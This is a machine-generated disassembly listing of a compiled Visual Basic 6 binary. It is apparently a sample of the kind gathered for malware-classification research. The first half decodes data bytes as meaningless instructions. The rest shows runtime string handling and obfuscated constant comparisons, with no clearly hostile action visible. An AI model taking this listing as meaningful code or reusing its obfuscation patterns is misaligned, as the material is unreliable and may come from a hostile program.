add [ ebx + 0x75 ] dl
arpl [ ebx + 0x75 ] sp
jb r-xdata
arpl [ ecx + 0x74 ] sp
je r-xdata
imul ebp [ edi ] 0x70105
dec ebx
cmp [ eax ] cl
add [ ebp + esi * 2 + 0x74 ] dl
outsb
imul si [ ebx + 0x68 ] 0x38
add al [ ecx + esi * 4 ]
add al 0x73
or eax [ ecx + 0xb13d813 ]
or al 0x0
dec esi
jns r-xdata
add [ esi + 0x6c ] al
jne r-xdata
xor [ eax ] eax
adc ch [ ebx ]
add bh bh
add ebp [ edx ]
add [ eax ] al
add [ edx + 0x9 ] cl
add [ ecx + 0x6e ] cl
add al [ eax + ecx * 8 ]
insb
jns r-xdata
add [ ecx ] cl
add al bh
or [ eax ] ecx
add eax 0x9e90f41
or [ eax ] esi
add bh bh
add ebp [ esi ]
add [ eax ] al
add [ edx + 0x8 ] dl
add [ eax + 0x69 ] dl
add [ esi + 0x5 ] cl
xor eax [ fs : eax ]
adc ebp [ 0x2603ff00 ]
add [ eax ] al
jb r-xdata
or esi [ ebp - 0x44fc6eed ]
or [ ebx ] cl
or [ eax ] al
push edx
jb r-xdata
add [ edx ] al
add al 0xc8
push ebp
adc dl [ ebx ]
or [ eax + 0xc ] ecx
leave
push 0x1050061
jns r-xdata
popad
insb
imul esi [ ecx + ebp * 2 + 0x65 ] 0x12003873
xor [ eax ] eax
inc [ ebx ]
add eax 0x47000701
popad
jb r-xdata
add bh bh
add esp [ ecx ]
jne r-xdata
imul esi [ ecx + ebp * 2 + 0x61 ] 0x646574
add al 0x1
pop es
add [ ebp + 0x66 ] al
jb r-xdata
add [ edx ] dl
sub eax [ eax ]
inc [ ebx ]
sub al [ eax ]
add [ eax ] al
dec edx
or [ eax ] eax
dec ecx
outsb
add [ ebx + 0x68 ] al
popad
jb r-xdata
imul esi [ ebx ] 0xa0105
push ebx
arpl [ eax + 0x6f ] bp
outsd
insb
insd
popad
popad
insd
add [ 0x29a118b ] al
add edx [ 0x29120d52 ]
add bh bh
add ebp [ ecx ]
add [ eax ] al
add [ esi + 0x7 ] al
add eax 0x12140623
adc al 0x49
adc eax 0xff000312
add ebx [ ebx ]
add [ eax ] al
add [ edi ] al
or [ eax ] al
push edx
popad
arpl [ ebx + 0x68 ] bp
popad
insd
xor eax 0x9c041600
xor eax [ gs : eax ]
add al 0x1
or eax [ eax ]
push edx
imul esi [ ebx + 0x69 ] 0x696c6962
je r-xdata
imul ebp [ ecx + ebp * 2 + 0x74 ] 0x4003579
popfd
or bh [ ebx - 0x18f3beef ]
outsd
insb
insd
insd
imul esp [ ebx ] 0x11d60225
xchg [ 0xf760894 ] eax
adc cl [ ecx ]
add [ edx ] al
outsd
add [ eax + eax + 0x6c ] ch
add [ ebp ] ch
popad
add [ esi ] ch
outsb
add [ ecx ] dh
add [ ebx ] dl
add [ eax ] al
push ss
add [ edi ] dl
add [ eax ] bl
add [ eax ] al
sbb [ ecx ] ecx
add [ edx + 0x6f ] al
insb
insb
insd
popad
outsb
outsb
xor [ eax ] eax
sbb eax [ eax ]
add [ 0x2d022c01 ] ah
add bh bh
add ebp [ esi ]
add [ eax ] al
add [ ecx + ecx ] dl
dec edi
jbe r-xdata
outsd
jb r-xdata
outsd
arpl [ ebx ] bp
add eax 0xfd406e9
pop ebp
push es
pop ebx
add al 0x12
push ebx
add [ eax ] al
add [ ebx + 0xb ] dl
add [ ebx + 0x61 ] dl
jne r-xdata
add [ eax ] al
add [ edi + 0xb ] cl
add [ eax + 0x65 ] cl
popad
insb
je r-xdata
or [ ecx ] dl
sub al 0x0
inc [ ebx ]
sub al 0x0
add [ eax ] al
add [ edx * 2 + 0x48091312 ] al
or al 0xc9
add [ edx ] dl
or [ eax ] al
push ebx
jne r-xdata
je r-xdata
push cs
mov [ 0xffffffffb605d906 ] al
add edi edi
add ebx [ edi ]
add al 0x9c
pop es
adc [ edx ] esi
add bh bh
add ebp [ eax ]
add [ eax ] al
add [ ebx ] al
or [ eax ] al
push ebx
outsd
insd
jbe r-xdata
xor eax 0xa9d0400
mov ebx 0xe70c4111
add [ eax ] al
add [ eax ] cl
or al 0x0
push ebx
jne r-xdata
insb
insb
add [ gs : ecx ] al
add [ esi ] eax
add [ ebp + 0x61 ] cl
outsb
jae r-xdata
outsb
jb r-xdata
jb r-xdata
push ebx
popad
insb
jns r-xdata
add [ eax ] al
add eax 0xc2c
outsd
jb r-xdata
add [ esi + edi * 8 ] al
or eax [ eax ]
add [ 0x13a2 ] al
push es
bound ecx [ edi ]
add [ eax ] al
inc [ ebx ]
popad
push 0x73646e65
cmp [ eax ] al
sbb [ ebx ] al
mov [ ecx ] dl
adc [ bp + si + 0x770c ] ebx
outsb
jae r-xdata
aaa
add [ 0x10b2066c ] al
out 0x13 eax
push 0x11210
inc [ ebx ]
add [ cs : eax ] al
add [ 0x69520009 ] al
insd
insb
jae r-xdata
inc [ ebx ]
jae r-xdata
jae r-xdata
outsb
jns r-xdata
or [ edx ] eax
std
push es
retn 0xf411
sbb [ ebx ] al
mov esp 0xa403c013
or al 0x30
adc edi edi
add esp [ edi ]
add [ eax ] al
add [ esi ] ah
or [ eax ] eax
push eax
jne r-xdata
push es
add esi ebp
push es
add [ eax ] al
add al 0xf
adc [ eax ] al
add [ 0xc2c ] al
jne r-xdata
add [ 0xfee ] al
push es
or [ ecx ] 0x0
add bh bh
add esp [ 0x29000000 ]
pop es
add [ ecx + 0x63 ] cl
insd
outsb
xor al 0x0
pop ss
add esi [ ebx + eax ]
add [ eax ] al
add al 0x23
adc [ eax ] al
add [ 0x918 ] al
push es
sub eax [ eax + eax ]
add bh bh
add ebp [ edx ]
add [ eax ] al
add [ ebx ] ch
or [ eax ] al
inc edx
popad
outsb
jae r-xdata
jae r-xdata
jns r-xdata
insb
jne r-xdata
sbb eax 0xd000000
or al [ eax ]
push esi
outsd
jae r-xdata
add al 0xff
add ebp [ edx ]
add [ eax ] al
add [ edx ] cl
or al 0x0
push ebp
outsb
jae r-xdata
add [ eax ] bl
add ecx [ eax - 0x65ee98ef ]
or al 0x77
add eax [ eax ]
add [ 0x5000009 ] al
pop es
add [ eax ] al
xor [ eax ] al
add [ ecx ] eax
or eax [ eax ]
dec edi
jo r-xdata
add al 0x97
push es

outsd
arpl [ eax + 0x6e ] bp
imul edi [ ecx ] 0x14090318
in al 0x9
0xa214
pop es
add [ eax ] al
insd
jae r-xdata
add bh bh
add ebp [ esi ]
add [ eax ] al
add [ 0x6850000d ] ch
jbe r-xdata
xchg edi eax
or [ eax ] eax
add bh bh
add ebx [ eax ]
add [ eax ] al
add [ edx ] ah
add eax 0x6d614b00
or al 0x0
add [ esi ] al
add [ edi ] dl
add edx [ ecx ]
add al 0x0
or esp [ edi + 0x1a1211 ]
popad
jb r-xdata
sbb [ ebx ] al
stosd [ edi ]
or [ ecx ] ecx
insd
jne r-xdata
popad
insd
outsb
arpl [ ecx ] di
pop ss
add edi [ edi + 0x400000c ]
aam 0x6
add [ eax ] al
add eax 0x124d
push es
xor [ edx ] al
add [ eax ] al
inc [ ebx ]
sbb [ eax ] eax
add [ eax ] al
sbb eax 0x6f460006
jb r-xdata
add [ es : eax ] al
add [ edi ] dl
or [ eax ] al
inc ecx
bound esp [ ebp + 0x79 ]
popad
push es
out dx eax
imul ebp [ ecx + ebp * 2 + 0x74 ] 0x3170079
and eax [ ebx ]
add [ eax ] al
add al 0x65
or [ eax ] eax
add [ 0x72e ] al
jns r-xdata
or [ eax + 0x12 ] cl
cli
or bh bh
add esp [ edi ]
add [ eax ] al
outsd
jb r-xdata
pop ss
outsb
jne r-xdata
je r-xdata
outsd
jo r-xdata
outsb
imul esp [ ebp + 0x6e ] 0x5006563
push esi
push es
cdq
or al 0x23
add [ ecx ] al
add [ eax ] ecx
add [ ebp + 0x61 ] cl
jae r-xdata
pop ss
add esp [ ebx ]
add [ ecx + ecx ] dh
add [ eax + 0x6f ] dl
jne r-xdata
outsd
outsb
outsd
jo r-xdata
xor al 0x0
pop ss
add esi [ ebp + 0x4000005 ]

jne r-xdata
add [ eax ] bl
add esp [ edx + 0x6 ]
add [ 0x6853000a ] bh
outsd
jae r-xdata
jae r-xdata
inc [ ebx ]
sbb al [ eax ]
add [ eax ] al
xor [ edi ] eax
add [ edx + 0x62 ] al
bound esp [ edx + 0x62 ]
bound esp [ edx ]
push ss
add al 0x5
or al 0xe4
imul ebp [ ecx + edi * 2 + 0x36 ] 0x2b60500
rcl [ ecx ] 0x1
add eax 0x1205d70f
insb
jns r-xdata
xor [ eax ] eax
add [ ecx ] eax
pop es
add [ ecx + 0x75 ] dl
popad
jb r-xdata
jae r-xdata
cli
outsb
imul esi [ ebx ] 0xa8031700
or eax [ eax ]
add [ esi ] al
add al [ eax ]
add [ 0x12e1 ] al
push es
jb r-xdata
add esi ebx
or bh bh
add ebx [ 0x49000000 ]
or al [ eax ]
push eax
popad
mov esi 0xfa0f750f
inc ecx
add esp [ ebp - 0xfaa8f4 ]
add ebx [ ebx ]
add [ eax ] al
add [ esi ] bh
or [ eax ] al
inc esi
imul ebp [ esi + 0x61 ] 0x72656c67
add [ esi ] dl
add al 0xc4
outsd
pop ss
add esi [ ecx + edx + 0x6e040000 ]
add al 0x0
add [ 0x237 ] al
push es
stc
add al [ eax ]
add bh bh
add esp [ edi ]
add [ eax ] al
add [ esi ] dh
add eax 0x696d4500
je r-xdata
je r-xdata
or cl [ edx ]
inc [ ebx ]
sbb al 0x0
imul ebp [ esi + 0x65 ] 0x377373
push ss
add al 0xc6
add al 0xa8
add eax 0xb940d60
inc [ ebx ]
and eax 0x4b000000
pop es
add [ edx + 0x75 ] dl
insb
insb
add [ edi ] dl
add edx [ esi + 0x400000d ]
sub [ eax ] ecx
add [ eax ] al
add eax 0x3f0
push es
fiadd [ 0x3ff0000 ]
add [ es : eax ] al
add [ ebp + 0x8 ] cl
add [ ecx + 0x75 ] dl
arpl [ eax + 0x61 ] bp
add [ eax ] al
push ebp
or [ eax ] eax
inc ebp
jo r-xdata
sbb [ ebx ] al
xchg esp eax
push cs
push ds
or ah [ edi ]
or [ edx ] ecx
or bh bh
add ebx [ eax + eax ]
not [ ecx ]
add [ eax ] al
inc [ ebx ]
pop ss
add [ eax ] al
add [ ecx + 0x4 ] dl
add [ esi + 0x73 ] cl
popad
jo r-xdata
outsd
aaa
add [ esi ] dl
add al 0xbe
pcmpeqw mmx1 [ edi ]
outsb
imul esi [ ebp ] 0x6620318
fld [ edi ]
add [ ecx ] al
add [ eax ] ecx
add [ esi + 0x6f ] al
jb r-xdata
add eax 0x14dd0516
ud2
add [ eax ] al
add [ eax ] al
or [ esi + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc di
je r-xdata
pop es
dec esp
add al 0x84
or [ ebx + ecx - 0x1 ] esp
add esp [ esi ]
add [ eax ] al
add [ ebx + 0x8 ] al
add [ ecx + 0x6e ] cl
push 0x6e697265
add [ bx ] dl
add esi esi
adc al 0x0
add [ edx + ecx ] al
sldt [ eax ]
add eax 0xe27
push es
imul ebp [ ecx + 0x6e ] 0x67
add [ 0xd3210f3 ] al
mov edi 0x1211930f
and [ eax ] al
inc [ ebx ]
and [ eax ] al
add [ eax ] al
aaa
or eax 0x73655700
je r-xdata
add [ eax ] cl
inc di
add [ eax ] cl
inc di
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] bl
add [ eax ] al
add al 0x0
add [ eax ] al
or [ esi + 0x47 ] ah
add [ eax + 0x66 ] cl
inc edi
add ah dh
add [ eax ] al
add [ eax ] al
or [ esi + 0x47 ] ah
insd
imul esp [ ebx + 0x33 ] 0xca031800
add al [ edx + edx ]
xor al 0x6
push 0x402ff04
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and al [ eax ]
add [ eax ] al
dec eax
or [ eax ] eax
dec esi
outsd
jb r-xdata
add bh bh
add ebx [ eax + eax ]
jne r-xdata
cmp al [ ebx ]
add [ eax ] al
inc [ ebx ]
sbb al 0x0
add [ esi ] al
adc cl [ edi ]
inc [ ebx ]
sbb eax 0x3d000000
or al [ eax ]
push ebx
push 0x6f68736f
insb
imul esi [ esi + 0x61 ] 0x1800376e
add ebp ebp
add al 0xd4
psubusw mmx0 [ edi ]
sub_47671f
inc [ eax ]
add [ eax ] al
add [ esi + ebp + 0x40 ] al
add ah bl
sub eax 0xbf480040
inc edi
add [ esi + ebp + 0x40 ] al
add [ esi + ebp - 0x40b3ffc0 ] al
inc edi
add [ esi + ebp + 0x40 ] al
add [ esi + ebp - 0x40afffc0 ] dh
inc edi
add [ esi + ebp + 0x40 ] al
add [ eax + 0x2f ] al
inc eax
add [ edi + edi * 4 + 0x47 ] dl
add [ esi + ebp + 0x40 ] al
add [ edi + ebp + 0x40 ] ah
add [ eax - 0x41 ] bl
inc edi
add [ esi + ebp + 0x40 ] al
add [ eax + 0x5c00402f ] al
mov edi 0x2e440047
inc eax
add [ edi + ebp - 0x409fffc0 ] ch
inc edi
add [ esi + ebp + 0x40 ] al
add ah al
das
inc eax
add [ edi + edi * 4 + 0x47 ] ah
add [ esi + ebp + 0x40 ] al
add ah ah
das
inc eax
add [ eax - 0x41 ] ch
inc edi
add [ esi + ebp + 0x40 ] al
add [ eax ] bl
xor [ eax ] al
insb
mov edi 0x2e440047
inc eax
add [ eax + 0x30 ] al
inc eax
add [ eax - 0x41 ] dh
inc edi
add [ esi + ebp + 0x40 ] al
add [ eax + esi + 0x40 ] bl
add [ edi + edi * 4 + 0x47 ] dh
add [ esi + ebp + 0x40 ] al
add [ eax + esi - 0x4087ffc0 ] ch
inc edi
add [ esi + ebp + 0x40 ] al
add ah ah
xor [ eax ] eax
jl r-xdata
inc edi
add ah cl
int3
sub_4767e0
push ebp
mov ebp esp
sub esp 0x8
push __vbaExceptHandler
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] esp
mov [ ebp - 0x4 ] sub_401158
mov edi [ __vbaRefVarAry@IAT ]
lea eax [ ebp - 0x90 ]
xor esi esi
push eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] esi
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] esi
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] esi
call edi
mov ecx [ eax ]
push ecx
push 0x1
call [ __vbaLbound@IAT ]
lea edx [ ebp - 0x90 ]
mov ebx eax
push edx
call edi
mov eax [ eax ]
push eax
push 0x1
call [ __vbaUbound@IAT ]
add ebx eax
mov ecx 0x6f
jo r-xdata
call [ __vbaErrorOverflow@IAT ]
nop
nop
nop
nop
nop
nop
nop
nop
mov [ ebp - 0x6c ] ebx
call [ __vbaUI1I2@IAT ]
fld [ r-xdata ]
call [ __vbaFPFix@IAT ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x34 ]
push ecx
push edx
push esi
fstp st0
call [ __vbaLsetFixstr@IAT ]
lea ecx [ ebp - 0xc0 ]
lea edx [ ebp - 0xa0 ]
lea eax [ ebp - 0x2c ]
push ecx
push edx
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xc0 ] 0x4008
call [ Ordinal_MSVBVM60_520@IAT ]
lea eax [ ebp - 0xa0 ]
push eax
call [ __vbaStrVarMove@IAT ]
mov edi [ __vbaStrMove@IAT ]
mov edx eax
lea ecx [ ebp - 0x68 ]
call edi
mov ebx [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0xa0 ]
call ebx
mov ecx [ ebp - 0x78 ]
push 0x5a
push ecx
call [ Ordinal_MSVBVM60_618@IAT ]
mov edx eax
lea ecx [ ebp - 0x80 ]
call edi
lea edx [ ebp - 0xa0 ]
push 0x324
push edx
call [ Ordinal_MSVBVM60_698@IAT ]
lea edx [ ebp - 0xa0 ]
lea ecx [ ebp - 0x58 ]
call [ __vbaVarMove@IAT ]
lea eax [ ebp - 0xa0 ]
lea ecx [ ebp - 0xb0 ]
push eax
push ecx
mov [ ebp - 0x98 ] 0x84
mov [ ebp - 0xa0 ] 0x2
call [ Ordinal_MSVBVM60_575@IAT ]
lea edx [ ebp - 0xb0 ]
lea ecx [ ebp - 0x48 ]
call [ __vbaVarMove@IAT ]
lea ecx [ ebp - 0xa0 ]
call ebx
mov edx [ ebp - 0x74 ]
push edx
call [ __vbaLenBstrB@IAT ]
lea eax [ ebp - 0xa0 ]
mov [ ebp - 0x98 ] 0x80020004
push eax
mov [ ebp - 0xa0 ] 0xa
call [ Ordinal_MSVBVM60_646@IAT ]
mov edx eax
lea ecx [ ebp - 0x38 ]
call edi
lea ecx [ ebp - 0xa0 ]
call ebx
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0xc0 ]
push ecx
push edx
mov [ ebp - 0xb8 ] esi
mov [ ebp - 0xc0 ] 0x8002
call [ __vbaVarTstNe@IAT ]
test ax ax
je r-xdata
lea eax [ ebp - 0xa0 ]
push 0x96
push eax
call [ Ordinal_MSVBVM60_526@IAT ]
lea ecx [ ebp - 0xa0 ]
push ecx
call [ __vbaStrVarMove@IAT ]
mov edx eax
lea ecx [ ebp - 0x70 ]
call edi
lea ecx [ ebp - 0xa0 ]
call ebx
fwait
push sub_476aac
jmp r-xdata
mov eax 0x2
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xc0 ] eax
lea eax [ ebp - 0x20 ]
lea edx [ ebp - 0xa0 ]
push eax
push ecx
push edx
call [ __vbaVarMul@IAT ]
mov edx eax
lea ecx [ ebp - 0x20 ]
call [ __vbaVarMove@IAT ]
mov edi [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0x20 ]
call edi
mov esi [ __vbaFreeStr@IAT ]
lea ecx [ ebp - 0x24 ]
call esi
lea ecx [ ebp - 0x28 ]
call esi
lea ecx [ ebp - 0x2c ]
call esi
lea ecx [ ebp - 0x34 ]
call esi
lea ecx [ ebp - 0x38 ]
call esi
lea ecx [ ebp - 0x48 ]
call edi
lea ecx [ ebp - 0x58 ]
call edi
lea ecx [ ebp - 0x68 ]
call esi
lea ecx [ ebp - 0x70 ]
call esi
lea ecx [ ebp - 0x74 ]
call esi
lea ecx [ ebp - 0x78 ]
call esi
lea ecx [ ebp - 0x80 ]
call esi
lea ecx [ ebp - 0x90 ]
call edi
retn
sub_476ad0
push ebp
mov ebp esp
sub esp 0x8
push __vbaExceptHandler
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x118
push ebx
push esi
push edi
mov [ ebp - 0x8 ] esp
mov [ ebp - 0x4 ] r-xdata
mov ecx 0xd
xor eax eax
lea edi [ ebp - 0x98 ]
xor edx edx
[ edi ]
lea eax [ ebp - 0x92 ]
mov edi [ Ordinal_MSVBVM60_650@IAT ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x54 ] edx
mov [ ebp - 0x64 ] edx
mov [ ebp - 0xa4 ] edx
mov [ ebp - 0xa8 ] edx
mov [ ebp - 0xac ] edx
mov [ ebp - 0xb0 ] edx
mov edx 0x80020004
mov [ ebp - 0xd8 ] eax
mov eax 0x4002
mov [ ebp - 0xb8 ] edx
mov ecx 0xa
mov [ ebp - 0xc8 ] edx
mov [ ebp - 0xe0 ] eax
mov [ ebp - 0x100 ] eax
push 0x1
lea edx [ ebp - 0xc0 ]
mov [ ebp - 0xc0 ] ecx
mov [ ebp - 0xd0 ] ecx
push 0x1
lea eax [ ebp - 0xe0 ]
lea ecx [ ebp - 0x94 ]
push edx
push eax
mov [ ebp - 0xf8 ] ecx
call edi
mov esi [ __vbaStrMove@IAT ]
mov edx eax
lea ecx [ ebp - 0xa8 ]
call esi
mov ebx [ __vbaStrCat@IAT ]
push eax
push r-xdata
call ebx
mov edx eax
lea ecx [ ebp - 0xac ]
call esi
push eax
push 0x1
lea ecx [ ebp - 0xd0 ]
push 0x1
lea edx [ ebp - 0x100 ]
push ecx
push edx
call edi
mov edx eax
lea ecx [ ebp - 0xb0 ]
call esi
push eax
call ebx
mov edx eax
mov ecx rw-data
call esi
lea eax [ ebp - 0xb0 ]
lea ecx [ ebp - 0xac ]
push eax
lea edx [ ebp - 0xa8 ]
push ecx
push edx
push 0x3
call [ __vbaFreeStrList@IAT ]
lea eax [ ebp - 0xd0 ]
lea ecx [ ebp - 0xc0 ]
push eax
push ecx
push 0x2
call [ __vbaFreeVarList@IAT ]
add esp 0x1c
push sub_476c8c
jmp r-xdata
mov esi [ __vbaFreeVar@IAT ]
lea ecx [ ebp - 0x20 ]
call esi
lea ecx [ ebp - 0x34 ]
call esi
lea ecx [ ebp - 0x44 ]
call esi
lea ecx [ ebp - 0x54 ]
call esi
lea ecx [ ebp - 0x64 ]
call esi
lea ecx [ ebp - 0xa4 ]
call [ __vbaFreeStr@IAT ]
retn
sub_476c29
lea edx [ ebp - 0xb0 ]
lea eax [ ebp - 0xac ]
push edx
lea ecx [ ebp - 0xa8 ]
push eax
push ecx
push 0x3
call [ __vbaFreeStrList@IAT ]
lea edx [ ebp - 0xd0 ]
lea eax [ ebp - 0xc0 ]
push edx
push eax
push 0x2
call [ __vbaFreeVarList@IAT ]
add esp 0x1c
retn
sub_476ca0
push ebp
mov ebp esp
sub esp 0x18
push __vbaExceptHandler
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax 0x364
call __vbaChkstk
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x14 ] r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x3
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x16c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x16c ] rw-data
jmp r-xdata
mov [ ebp - 0x170 ] 0x0
push 0x2a4
push r-xdata
mov edx [ ebp - 0x144 ]
push edx
mov eax [ ebp - 0x148 ]
push eax
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x170 ] eax
jmp r-xdata
mov eax [ ebp - 0x16c ]
mov ecx [ eax ]
mov [ ebp - 0x144 ] ecx
mov [ ebp - 0x130 ] 0x1
mov [ ebp - 0x138 ] 0x2
mov [ ebp - 0x120 ] 0x1
mov [ ebp - 0x128 ] 0x2
mov [ ebp - 0x110 ] 0x1
mov [ ebp - 0x118 ] 0x2
mov eax 0x10
call __vbaChkstk
mov edx esp
mov eax [ ebp - 0x138 ]
mov [ edx ] eax
mov ecx [ ebp - 0x134 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x130 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x12c ]
mov [ edx + 0xc ] ecx
mov eax 0x10
call __vbaChkstk
mov edx esp
mov eax [ ebp - 0x128 ]
mov [ edx ] eax
mov ecx [ ebp - 0x124 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x120 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x11c ]
mov [ edx + 0xc ] ecx
mov eax 0x10
call __vbaChkstk
mov edx esp
mov eax [ ebp - 0x118 ]
mov [ edx ] eax
mov ecx [ ebp - 0x114 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x110 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x10c ]
mov [ edx + 0xc ] ecx
push 0x3f800000
mov edx [ ebp - 0x144 ]
mov eax [ edx ]
mov ecx [ ebp - 0x144 ]
push ecx
call [ eax + 0x2a4 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x174 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x174 ] rw-data
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
mov edx r-xdata
lea ecx [ ebp - 0xd8 ]
call [ __vbaStrCopy@IAT ]
mov [ ebp - 0x4 ] 0x5
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x178 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x178 ] rw-data
jmp r-xdata
push r-xdata
mov ecx [ ebp - 0xd8 ]
push ecx
call [ __vbaStrCat@IAT ]
mov edx eax
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrMove@IAT ]
push eax
mov edx [ ebp - 0x174 ]
mov eax [ edx ]
push eax
push r-xdata
call [ __vbaPrintObj@IAT ]
add esp 0xc
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0x6
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x17c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x17c ] rw-data
jmp r-xdata
push r-xdata
mov ecx [ ebp - 0xd8 ]
push ecx
call [ __vbaStrCat@IAT ]
mov edx eax
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrMove@IAT ]
push eax
mov edx [ ebp - 0x178 ]
mov eax [ edx ]
push eax
push r-xdata
call [ __vbaPrintObj@IAT ]
add esp 0xc
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0x7
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x180 ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x180 ] rw-data
jmp r-xdata
push r-xdata
mov ecx [ ebp - 0xd8 ]
push ecx
call [ __vbaStrCat@IAT ]
mov edx eax
lea ecx [ ebp - 0xe4 ]
call [ __vbaStrMove@IAT ]
push eax
mov edx [ ebp - 0x17c ]
mov eax [ edx ]
push eax
push r-xdata
call [ __vbaPrintObj@IAT ]
add esp 0xc
lea ecx [ ebp - 0xe4 ]
call [ __vbaFreeStr@IAT ]
mov [ ebp - 0x4 ] 0x8
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xd
cmp [ ebp - 0x38 ] 0xaf43d0e0
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x184 ]
jne r-xdata
mov ecx [ ebp - 0x180 ]
mov edx [ ecx ]
push edx
lea eax [ ebp - 0x3c ]
push eax
call [ __vbaObjSetAddref@IAT ]
mov [ ebp - 0x4 ] 0x9
mov ecx 0x4d95c6d0
neg ecx
mov edx 0x1c0
adc edx 0x0
neg edx
mov [ ebp - 0x188 ] ecx
mov [ ebp - 0x184 ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x11
mov ecx 0xb82c61f0
neg ecx
mov edx 0x1275
adc edx 0x0
neg edx
mov [ ebp - 0x198 ] ecx
mov [ ebp - 0x194 ] edx
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x198 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x1190
jne r-xdata
mov [ ebp - 0x4 ] 0xa
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x15
mov eax 0x11d90220
neg eax
mov ecx 0x30e
adc ecx 0x0
neg ecx
mov [ ebp - 0x1a8 ] eax
mov [ ebp - 0x1a4 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x1a8 ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x194 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xe
push 0x0
push r-xdata
mov eax [ ebp - 0xe0 ]
push eax
call [ __vbaLateMemCall@IAT ]
add esp 0xc
jmp r-xdata
mov [ ebp - 0x18c ] rw-data
push rw-data
push r-xdata
call [ __vbaNew2@IAT ]
mov [ ebp - 0x18c ] rw-data
jmp r-xdata
mov [ ebp - 0x4 ] 0x19
cmp [ ebp - 0x38 ] 0x726b79c0
jne r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x1a4 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x12
cmp [ rw-data ] 0x0
jne r-xdata
fwait
push sub_479ac0
jmp r-xdata
mov [ ebp - 0x190 ] 0x0
push 0x54
push r-xdata
mov ecx [ ebp - 0x144 ]
push ecx
mov edx [ ebp - 0x148 ]
push edx
call [ __vbaHresultCheckObj@IAT ]
mov [ ebp - 0x190 ] eax
jmp r-xdata
mov edx [ ebp - 0x18c ]
mov eax [ edx ]
mov [ ebp - 0x144 ] eax
push r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ecx ]
mov eax [ ebp - 0x144 ]
push eax
call [ edx + 0x54 ]
fnclex
mov [ ebp - 0x148 ] eax
cmp [ ebp - 0x148 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x1d
mov eax 0xc80b15a0
neg eax
mov ecx 0x567
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
mov edx [ ebp - 0x38 ]
cmp edx [ ebp - 0x1b8 ]
jne r-xdata
cmp [ ebp - 0x34 ] 0x3da
jne r-xdata
mov [ ebp - 0x4 ] 0x16
push 0x0
push r-xdata
